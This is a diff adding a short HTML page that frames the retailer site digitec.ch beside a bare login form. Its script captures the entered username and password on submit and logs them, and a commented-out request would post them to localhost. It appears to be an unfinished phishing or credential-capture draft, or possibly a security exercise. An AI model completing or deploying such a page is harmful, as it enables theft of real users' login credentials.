@@ -1,0 +1,40 @@
+<html>
+<head>
+</head>
+<body>
+
+    
+    <iframe src="https://digitec.ch"></iframe>
+    <form method="post" id="loginForm">
+
+        <input type="text" name="username" id="username">
+        <input type="password" name="password" id="password">
+
+
+
+        <input type="submit" value="log in" name="submit">
+    </form> 
+
+    <script>
+
+
+        document.getElementById("loginForm").addEventListener("submit", function (e) {
+            if(e.target && e.target.id === "loginForm")
+            {
+                var xmlhttp = new XMLHttpRequest();
+
+                var username = document.getElementById("username");
+                var password = document.getElementById("password");
+
+
+                console.log(username, password);
+
+                var xhr = new XMLHttpRequest();
+                //xhr.open("POST", "..localhost...)
+            }
+        });
+
+
+    </script>
+</body>
+</html>
